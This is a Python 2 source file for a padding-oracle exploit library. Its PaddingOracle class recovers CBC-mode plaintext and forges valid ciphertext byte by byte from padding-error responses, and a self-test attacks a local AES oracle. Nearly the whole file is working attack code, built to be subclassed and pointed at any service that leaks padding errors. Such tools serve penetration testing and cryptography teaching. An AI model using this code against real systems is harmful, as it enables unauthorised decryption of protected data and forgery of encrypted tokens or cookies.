# -*- coding: utf-8 -*-
'''
Padding Oracle Exploit API
~~~~~~~~~~~~~~~~~~~~~~~~~~
'''
from itertools import izip, cycle
import logging

__all__ = [
    'BadPaddingException',
    'PaddingOracle',
    ]


class BadPaddingException(Exception):
    '''
    Raised when a blackbox decryptor reveals a padding oracle.

    This Exception type should be raised in :meth:`.PaddingOracle.oracle`.
    '''


class PaddingOracle(object):
    '''
    Implementations should subclass this object and implement
    the :meth:`oracle` method.

    :param int max_retries: Number of attempts per byte to reveal a
        padding oracle, default is 3. If an oracle does not reveal
        itself within `max_retries`, a :exc:`RuntimeError` is raised.
    '''

    def __init__(self, **kwargs):
        self.log = logging.getLogger(self.__class__.__name__)
        self.max_retries = int(kwargs.get('max_retries', 3))
        self.attempts = 0
        self.history = []
        self._decrypted = None
        self._encrypted = None

    def oracle(self, data, **kwargs):
        '''
        Feeds *data* to a decryption function that reveals a Padding
        Oracle. If a Padding Oracle was revealed, this method
        should raise a :exc:`.BadPaddingException`, otherwise this
        method should just return.

        A history of all responses should be stored in :attr:`~.history`,
        regardless of whether they revealed a Padding Oracle or not.
        Responses from :attr:`~.history` are fed to :meth:`analyze` to
        help identify padding oracles.

        :param bytearray data: A bytearray of (fuzzed) encrypted bytes.
        :raises: :class:`BadPaddingException` if decryption reveals an
            oracle.
        '''
        raise NotImplementedError

    def analyze(self, **kwargs):
        '''
        This method analyzes return :meth:`oracle` values stored in
        :attr:`~.history` and returns the most likely
        candidate(s) that reveals a padding oracle.
        '''
        raise NotImplementedError

    def encrypt(self, plaintext, block_size=8, iv=None, **kwargs):
        '''
        Encrypts *plaintext* by exploiting a Padding Oracle.

        :param plaintext: Plaintext data to encrypt.
        :param int block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be null's.
        :returns: Encrypted data.
        '''
        pad = block_size - (len(plaintext) % block_size)
        plaintext = bytearray(plaintext + chr(pad) * pad)

        self.log.debug('Attempting to encrypt %r bytes', str(plaintext))

        if iv is not None:
            iv = bytearray(iv)
        else:
            iv = bytearray(block_size)

        self._encrypted = encrypted = iv
        block = encrypted

        n = len(plaintext + iv)
        while n > 0:
            intermediate_bytes = self.bust(block, block_size=block_size,
                                           **kwargs)

            block = xor(intermediate_bytes,
                        plaintext[n - block_size * 2:n + block_size])

            encrypted = block + encrypted

            n -= block_size

        return encrypted

    def decrypt(self, ciphertext, block_size=8, iv=None, **kwargs):
        '''
        Decrypts *ciphertext* by exploiting a Padding Oracle.

        :param ciphertext: Encrypted data.
        :param int block_size: Cipher block size (in bytes).
        :param iv: The initialization vector (iv), usually the first
            *block_size* bytes from the ciphertext. If no iv is given
            or iv is None, the first *block_size* bytes will be used.
        :returns: Decrypted data.
        '''
        ciphertext = bytearray(ciphertext)

        self.log.debug('Attempting to decrypt %r bytes', str(ciphertext))

        assert len(ciphertext) % block_size == 0, \
            "Ciphertext not of block size %d" % (block_size, )

        if iv is not None:
            iv, ctext = bytearray(iv), ciphertext
        else:
            iv, ctext = ciphertext[:block_size], ciphertext[block_size:]

        self._decrypted = decrypted = bytearray(len(ctext))

        n = 0
        while ctext:
            block, ctext = ctext[:block_size], ctext[block_size:]

            intermediate_bytes = self.bust(block, block_size=block_size,
                                           **kwargs)

            # XOR the intermediate bytes with the the previous block (iv)
            # to get the plaintext

            decrypted[n:n + block_size] = xor(intermediate_bytes, iv)

            self.log.info('Decrypted block %d: %r',
                          n / block_size, str(decrypted[n:n + block_size]))

            # Update the IV to that of the current block to be used in the
            # next round

            iv = block
            n += block_size

        return decrypted

    def bust(self, block, block_size=8, **kwargs):
        '''
        A block buster. This method busts one ciphertext block at a time.
        This method should not be called directly, instead use
        :meth:`decrypt`.

        :param block:
        :param int block_size: Cipher block size (in bytes).
        :returns: A bytearray containing the decrypted bytes
        '''
        intermediate_bytes = bytearray(block_size)

        test_bytes = bytearray(block_size)  # '\x00\x00\x00\x00...'
        test_bytes.extend(block)

        self.log.debug('Processing block %r', str(block))

        retries = 0
        last_ok = 0
        while retries < self.max_retries:

            # Work on one byte at a time, starting with the last byte
            # and moving backwards

            for byte_num in reversed(xrange(block_size)):

                # clear oracle history for each byte

                self.history = []

                # Break on first value that returns an oracle, otherwise if we
                # don't find a good value it means we have a false positive
                # value for the last byte and we need to start all over again
                # from the last byte. We can resume where we left off for the
                # last byte though.

                r = 256
                if byte_num == block_size - 1 and last_ok > 0:
                    r = last_ok

                for i in reversed(xrange(r)):

                    # Fuzz the test byte

                    test_bytes[byte_num] = i

                    # If a padding oracle could not be identified from the
                    # response, this indicates the padding bytes we sent
                    # were correct.

                    try:
                        self.attempts += 1
                        self.oracle(test_bytes[:], **kwargs)

                        if byte_num == block_size - 1:
                            last_ok = i

                    except BadPaddingException:

                        # TODO
                        # if a padding oracle was seen in the response,
                        # do not go any further, try the next byte in the
                        # sequence. If we're in analysis mode, re-raise the
                        # BadPaddingException.

                        if self.analyze is True:
                            raise
                        else:
                            continue

                    except Exception:
                        self.log.exception('Caught unhandled exception!\n'
                                           'Decrypted bytes so far: %r\n'
                                           'Current variables: %r\n',
                                           intermediate_bytes, self.__dict__)
                        raise

                    current_pad_byte = block_size - byte_num
                    next_pad_byte = block_size - byte_num + 1
                    decrypted_byte = test_bytes[byte_num] ^ current_pad_byte

                    intermediate_bytes[byte_num] = decrypted_byte

                    for k in xrange(byte_num, block_size):

                        # XOR the current test byte with the padding value
                        # for this round to recover the decrypted byte

                        test_bytes[k] ^= current_pad_byte

                        # XOR it again with the padding byte for the
                        # next round

                        test_bytes[k] ^= next_pad_byte

                    break

                else:
                    self.log.debug("byte %d not found, restarting" % byte_num)
                    retries += 1

                    break
            else:
                break

        else:
            raise RuntimeError('Could not decrypt byte %d in %r within '
                               'maximum allotted retries (%d)' % (
                               byte_num, block, self.max_retries))

        return intermediate_bytes


def xor(data, key):
    '''
    XOR two bytearray objects with each other.
    '''
    return bytearray([x ^ y for x, y in izip(data, cycle(key))])


def test():
    import os
    from Crypto.Cipher import AES

    teststring = 'The quick brown fox jumped over the lazy dog'

    def pkcs7_pad(data, blklen=16):
        if blklen > 255:
            raise ValueError('Illegal block size %d' % (blklen, ))
        pad = (blklen - (len(data) % blklen))
        return data + chr(pad) * pad

    class PadBuster(PaddingOracle):
        def oracle(self, data):
            _cipher = AES.new(key, AES.MODE_CBC, str(iv))
            ptext = _cipher.decrypt(str(data))
            plen = ord(ptext[-1])

            padding_is_good = (ptext[-plen:] == chr(plen) * plen)

            if padding_is_good:
                return

            raise BadPaddingException

    padbuster = PadBuster()

    for _ in xrange(100):
        key = os.urandom(AES.block_size)
        iv = bytearray(os.urandom(AES.block_size))

        print "Testing padding oracle exploit in DECRYPT mode"
        cipher = AES.new(key, AES.MODE_CBC, str(iv))

        data = pkcs7_pad(teststring, blklen=AES.block_size)
        ctext = cipher.encrypt(data)

        print "Key:        %r" % (key, )
        print "IV:         %r" % (iv, )
        print "Plaintext:  %r" % (data, )
        print "Ciphertext: %r" % (ctext, )

        decrypted = padbuster.decrypt(ctext, block_size=AES.block_size, iv=iv)

        print "Decrypted:  %r" % (str(decrypted), )
        print "\nRecovered in %d attempts\n" % (padbuster.attempts, )

        assert decrypted == data, \
            'Decrypted data %r does not match original %r' % (
                decrypted, data)

        print "Testing padding oracle exploit in ENCRYPT mode"
        cipher2 = AES.new(key, AES.MODE_CBC, str(iv))

        encrypted = padbuster.encrypt(teststring, block_size=AES.block_size)

        print "Key:        %r" % (key, )
        print "IV:         %r" % (iv, )
        print "Plaintext:  %r" % (teststring, )
        print "Ciphertext: %r" % (str(encrypted), )

        decrypted = cipher2.decrypt(str(encrypted))[AES.block_size:]
        decrypted = decrypted.rstrip(decrypted[-1])

        print "Decrypted:  %r" % (str(decrypted), )
        print "\nRecovered in %d attempts" % (padbuster.attempts, )

        assert decrypted == teststring, \
            'Encrypted data %r does not decrypt to %r, got %r' % (
                encrypted, teststring, decrypted)


if __name__ == '__main__':
    test()
